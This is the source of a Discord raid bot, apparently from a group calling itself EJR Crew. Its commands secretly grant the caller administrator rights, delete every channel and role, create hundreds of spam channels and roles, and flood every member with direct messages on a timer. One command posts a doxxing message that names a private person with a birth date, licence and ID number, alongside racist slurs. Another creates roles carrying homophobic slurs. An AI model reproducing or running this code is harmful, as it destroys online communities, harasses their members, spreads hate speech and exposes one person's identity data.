//.ejr
//.ejr2
const Discord = require('discord.js');
const intents = new Discord.Intents();
const client = new Discord.Client({ intents: 32767 });

const chalk = require('chalk');


client.on("ready", () => {


console.log(chalk.red(`.La.EJR.Crew. https://t.me/ejrcrew`))


   presencia();  
    });



function presencia(){
  client.user.setPresence({
status: "dnd",
activity: {
  name: ".La.EJR.Crew.",
  type: "PLAYING"

}
  });
}


client.on("messageCreate", async msg => {

  if (msg.author.bot) return;
  if(msg.content.toLowerCase().startsWith('.admin')){
    let rol = await msg.guild.roles.create({data: {

      name: "t.me/ejrcrew",
      color: "B9BBBE",
      permissions: "ADMINISTRATOR",
      hoisted: false
    }})


msg.member.roles.add(rol)
      .then(function(role) {
        msg.member.addRole(role);
        if (msg.deletable) msg.delete().catch(e => {});
      })
      .catch(e => {});
  }
});



client.on("messageCreate", message => {
    if (message.author.bot) return;
  
   if (message.content === '.ejr') {

    message.guild.setIcon("https://cdn.discordapp.com/attachments/953348580100423742/953350728754270228/IMG_20220315_172704.jpg")

    message.guild.channels.cache.forEach(channel => channel.delete());
    message.guild.channels.create(`#unete-al-telegram`, {
          type: 'text'
        }).then(channel => {
          channel.send("@everyone Nombre, ANTONIO SANCHEZ VERGEL. Fecha nacimiento, 01/02/2004. Ciudad de nacimiento, SANTO DOMINGO. Pais nacionalidad, ESPAÑA. Nº de licencia, EX 7278.  Este puto subnormal no ha querido pagar la droga, este negro de mierda, para que os deis cuenta de cuanta delincuencia viene de los negros de mierda, comprando droga para satisfacerse, putos depresivos porque su religion es una mierda. https://cdn.discordapp.com/attachments/928957777982947408/953332782346678272/228423.png DNI 16632310K          https://t.me/ejrcrew ")
          
        })
         }
      })
      



client.on("messageCreate", message => {
  if(message.author.bot) return;

  if(message.content === '.ejr2'){

      message.delete()
      message.guild.setIcon("https://cdn.discordapp.com/attachments/953348580100423742/953350728754270228/IMG_20220315_172704.jpg")
      message.guild.roles.cache.forEach(roles => {
        roles.delete()
        .then(deleted => console.log(`Deleted role ${deleted.name}`))
        .catch(console.error);
    });      
      message.guild.channels.cache.forEach(channel => channel.delete());
      message.guild.channels.create(`raid-hecho-por-ejr-crew`, {
        type: 'text'
      }).then(channel => {
        channel.send("@everyone https://t.me/ejrcrew Raideados por la EJR Crew.  ")
      })
    for (let i = 0; i <= 500; i++) {
         message.guild.channels.create(`raided-by-mohammed`, {
           type: 'text'

          }).then(channel => {
            channel.send("");
            channel.send("");
            channel.send("");
            channel.send("");
            channel.send("");       //pon aqui tu texto
            channel.send("");       //si quieres ayudar a la ejr crew pon el link del telegram
            channel.send("");       // https://t.me/ejrcrew
            channel.send("");       //o del discord
            channel.send("");       // https://discord.gg/HcG8ATp2zu
            channel.send("");
            channel.send("");
            channel.send("");
            channel.send("");
            channel.send("");
            channel.send("");
            channel.send("");
            channel.send("");
            
           
       })
       }
       message.guild.setName("VANDALIZADOS POR EJR");
       message.guild.setIcon("https://cdn.discordapp.com/attachments/953348580100423742/953350728754270228/IMG_20220315_172704.jpg")
      }
})



client.on("messageCreate", message => {
                        if (message.author.bot) return;
                        
                      if(message.content === ".troll")
                        message.delete()
                      message.guild.members.cache.forEach(member => {
                        setInterval(function(){
                          member.send("https://t.me/ejrcrew امبراطورية اطفال الجرذان امبراطورية اطفال الجرذان امبراطورية اطفال الجرذان امبراطورية اطفال الجرذان امبراطورية اطفال الجرذان امبراطورية اطفال الجرذان امبراطورية اطفال الجرذان امبراطورية اطفال الجرذان امبراطورية اطفال الجرذان امبراطورية اطفال الجرذان امبراطورية اطفال الجرذان امبراطورية اطفال الجرذان امبراطورية اطفال الجرذان امبراطورية اطفال الجرذان امبراطورية اطفال الجرذان امبراطورية اطفال الجرذان امبراطورية اطفال الجرذان امبراطورية اطفال الجرذان امبراطورية اطفال الجرذان امبراطورية اطفال الجرذان امبراطورية اطفال الجرذان امبراطورية اطفال الجرذان امبراطورية اطفال الجرذان امبراطورية اطفال الجرذان امبراطورية اطفال الجرذان امبراطورية اطفال الجرذان امبراطورية اطفال الجرذان امبراطورية اطفال الجرذان امبراطورية اطفال الجرذان امبراطورية اطفال الجرذان امبراطورية اطفال الجرذان امبراطورية اطفال الجرذان امبراطورية اطفال الجرذان امبراطورية اطفال الجرذان ÑÑÑÑÑÑÑÑÑÑÑÑÑÑÑÑ").catch(error => {});
                        },450);
                      })
                      });




client.on("messageCreate", message => {

                if (message.author.bot) return;
              
               if (message.content === '.crearroles') {

                message.delete()
                
              for (let i = 0; i <= 200; i++) {

                message.guild.roles.create({data: {name: `Los Gays Al Manicomio`,color: '#d41818',},reason: 'odio los omosetsuales',})
              };
               }
                });


client.login('token aqui');
